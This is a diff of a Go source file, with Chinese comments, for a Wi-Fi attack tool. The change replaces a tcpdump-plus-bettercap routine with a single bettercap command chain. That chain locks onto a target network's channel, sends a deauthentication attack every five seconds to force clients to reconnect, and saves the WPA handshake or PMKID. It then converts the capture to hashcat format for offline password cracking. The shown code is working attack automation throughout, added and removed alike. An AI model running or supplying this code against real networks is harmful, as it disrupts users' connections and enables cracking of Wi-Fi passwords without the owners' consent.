@@ -87,9 +87,9 @@ func CheckTools() []string {
 
 // ============================================================
 // CaptureHandshake 完整的握手包捕获流程
-// 流程: disassociate → tcpdump监控捕获(beacon+EAPOL) → bettercap deauth → 等待 → 转hashcat
-// 注意: tcpdump和bettercap不能同时以不同模式操作同一接口
-// 正确做法: 先启动tcpdump监控，然后用bettercap发deauth，最后停止tcpdump
+// 方案: 纯bettercap（同时做监控+deauth+握手捕获，避免接口争抢）
+// bettercap自带wifi.handshakes.file参数，自动保存EAPOL/PMKID到pcap
+// 流程: bettercap(recon+deauth+捕获) → hcxpcapngtool(转hashcat格式)
 // ============================================================
 func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) CaptureResult {
 	start := time.Now()
@@ -105,18 +105,20 @@ func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) Captur
 		return result
 	}
 
-	// 生成文件名前缀（SSID可能含特殊字符，用BSSID做文件名）
 	safeName := strings.ReplaceAll(bssid, ":", "")
-	result.BeaconFile = filepath.Join(cfg.OutputDir, safeName+"_beacon.cap")
-	result.HandFile = filepath.Join(cfg.OutputDir, safeName+"_handshake.cap")
-	result.MergedFile = filepath.Join(cfg.OutputDir, safeName+"_capture.cap")
+	capFile := filepath.Join(cfg.OutputDir, safeName+"_handshakes.pcap")
+	result.MergedFile = capFile
 	result.HashFile = filepath.Join(cfg.OutputDir, safeName+"_hash.22000")
 
-	// 清理旧文件（避免上次残留影响判断）
-	os.Remove(result.BeaconFile)
-	os.Remove(result.HandFile)
-	os.Remove(result.MergedFile)
+	// 清理旧文件
+	os.Remove(capFile)
 	os.Remove(result.HashFile)
+
+	// 转为绝对路径（bettercap工作目录可能不同）
+	absCapFile, _ := filepath.Abs(capFile)
+	absHashFile, _ := filepath.Abs(result.HashFile)
+	result.MergedFile = absCapFile
+	result.HashFile = absHashFile
 
 	logf := func(format string, args ...interface{}) {
 		if cfg.Verbose {
@@ -124,59 +126,50 @@ func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) Captur
 		}
 	}
 
-	// ── 步骤1: 断开当前WiFi连接（disassociate，让接口可进入监控模式） ──
-	logf("[1/5] 断开当前WiFi连接...")
-	// 方法1: wdutil disconnect（macOS 26.3推荐）
-	runCmd("sudo", "wdutil", "disconnect")
-	time.Sleep(1 * time.Second)
+	// ── 步骤1: 用bettercap一次性完成 监控+deauth+握手捕获 ──
+	logf("[1/3] 启动bettercap（监控+deauth+握手捕获一体化）...")
+	logf("  目标: %s (%s) 频道: %d", ssid, bssid, channel)
 
-	// ── 步骤2: 启动tcpdump全量捕获（beacon + EAPOL一起抓） ──
-	logf("[2/5] 启动tcpdump监控模式捕获（beacon+EAPOL）...")
+	// bettercap eval命令序列:
+	// 1. 设置握手包保存路径
+	// 2. 锁定目标频道（避免跳频错过握手）
+	// 3. 开启wifi监控
+	// 4. 用ticker定时发deauth（每5秒一次）
+	// 5. 等待足够时间让客户端重连
+	evalCmds := fmt.Sprintf(
+		"set wifi.handshakes.file %s; "+
+			"wifi.recon.channel %d; "+
+			"wifi.recon on; "+
+			"set ticker.period 5; "+
+			"set ticker.commands \"wifi.deauth %s\"; "+
+			"ticker on",
+		absCapFile, channel, bssid,
+	)
+
 	ctx, cancel := context.WithTimeout(context.Background(), cfg.HandTimeout)
 	defer cancel()
 
-	// 捕获目标AP的所有管理帧和EAPOL帧（一次tcpdump完成，避免接口竞争）
-	// 过滤条件: beacon帧 或 EAPOL帧，且与目标BSSID相关
-	capFilter := fmt.Sprintf("(type mgt subtype beacon and ether src %s) or (ether proto 0x888e and ether host %s)", bssid, bssid)
-	capFile := filepath.Join(cfg.OutputDir, safeName+"_all.cap")
-	os.Remove(capFile)
-
-	tcpCmd := exec.CommandContext(ctx, "sudo", "tcpdump",
-		capFilter,
-		"-I",                // 监控模式
-		"-U",                // 无缓冲写入
-		"-i", cfg.Interface,
-		"-w", capFile,
+	cmd := exec.CommandContext(ctx, "sudo", "bettercap",
+		"-iface", cfg.Interface,
+		"-eval", evalCmds,
 	)
-	tcpCmd.Stderr = os.Stderr
-	if err := tcpCmd.Start(); err != nil {
-		result.Error = fmt.Sprintf("启动tcpdump失败: %v", err)
+	if cfg.Verbose {
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+	}
+
+	logf("[2/3] bettercap运行中（deauth每5秒一次，超时%s）...", cfg.HandTimeout)
+	cmd.Run()
+
+	// ── 步骤2: 检查并转换握手包 ──
+	logf("[3/3] 转换数据包为hashcat格式...")
+
+	if !fileExists(absCapFile) {
+		result.Error = "bettercap未捕获到任何握手包文件"
+		result.Duration = time.Since(start)
 		return result
 	}
 
-	// 等待2秒让tcpdump稳定进入监控模式
-	time.Sleep(2 * time.Second)
-
-	// ── 步骤3: 发送deauth攻击（在另一个进程中，不干扰tcpdump） ──
-	logf("[3/5] 发送反认证攻击（%d轮，间隔%s）...", cfg.DeauthCount, cfg.DeauthDelay)
-	sendDeauth(bssid, cfg)
-
-	// ── 步骤4: 继续等待握手包（deauth后客户端重连需要时间） ──
-	logf("[4/5] 等待客户端重连并捕获握手包（剩余%s）...", cfg.HandTimeout)
-	waitForHandshake(tcpCmd, ctx)
-
-	// 确保 tcpdump 已停止
-	if tcpCmd.Process != nil {
-		tcpCmd.Process.Signal(os.Interrupt)
-		time.Sleep(500 * time.Millisecond)
-		tcpCmd.Process.Kill()
-	}
-	tcpCmd.Wait()
-
-	// ── 步骤5: 转换格式 ──
-	logf("[5/5] 转换数据包为hashcat格式...")
-	// 直接用捕获文件转换（已包含beacon+EAPOL，无需merge）
-	result.MergedFile = capFile
 	convertOK, hasPMKID, hasHand := convertToHashcat(result)
 	result.HasPMKID = hasPMKID
 	result.HasHandshk = hasHand
@@ -184,7 +177,7 @@ func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) Captur
 	if result.Success {
 		logf("  ✓ 转换成功 (PMKID=%v, 握手=%v)", hasPMKID, hasHand)
 	} else {
-		logf("  ✗ 无有效PMKID或握手包")
+		logf("  ✗ 无有效PMKID或握手包（可能目标无客户端连接或启用了PMF）")
 		result.Error = "未捕获到有效的PMKID或握手包"
 	}
 
@@ -201,61 +194,6 @@ func RestoreWiFiInterface(iface string) {
 	time.Sleep(500 * time.Millisecond)
 	runCmd("networksetup", "-setairportpower", iface, "on")
 	time.Sleep(1 * time.Second)
-}
-
-// ============================================================
-// waitForHandshake 等待握手包捕获完成
-// ============================================================
-func waitForHandshake(cmd *exec.Cmd, ctx context.Context) bool {
-	// 等待命令结束（超时或手动取消）
-	done := make(chan error, 1)
-	go func() {
-		done <- cmd.Wait()
-	}()
-
-	select {
-	case <-ctx.Done():
-		// 超时，终止tcpdump
-		if cmd.Process != nil {
-			cmd.Process.Signal(os.Interrupt)
-			time.Sleep(500 * time.Millisecond)
-			cmd.Process.Kill()
-		}
-		// 检查是否已经捕获到了数据
-		return true // 即使超时也返回true，后续检查文件内容
-	case err := <-done:
-		return err == nil
-	}
-}
-
-// ============================================================
-// sendDeauth 通过bettercap发送反认证攻击
-// 注意: bettercap不支持sleep命令，改用多次独立调用+Go层间隔
-// bettercap会自己管理WiFi接口，不会干扰已在运行的tcpdump
-// ============================================================
-func sendDeauth(bssid string, cfg CaptureConfig) {
-	for i := 0; i < cfg.DeauthCount; i++ {
-		if cfg.Verbose {
-			fmt.Printf("      deauth轮次 %d/%d → %s\n", i+1, cfg.DeauthCount, bssid)
-		}
-
-		// bettercap -eval中用分号分隔命令，不能用sleep
-		// 正确做法: wifi.recon on → 等待发现目标 → wifi.deauth → quit
-		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
-		evalCmd := fmt.Sprintf("wifi.recon on; wifi.deauth %s; wifi.deauth %s; wifi.deauth %s; quit", bssid, bssid, bssid)
-		cmd := exec.CommandContext(ctx, "sudo", "bettercap",
-			"-iface", cfg.Interface,
-			"-eval", evalCmd,
-		)
-		cmd.Stdout = nil
-		cmd.Stderr = nil
-		cmd.Run()
-		cancel()
-
-		if i < cfg.DeauthCount-1 {
-			time.Sleep(cfg.DeauthDelay)
-		}
-	}
 }
 
 // ============================================================
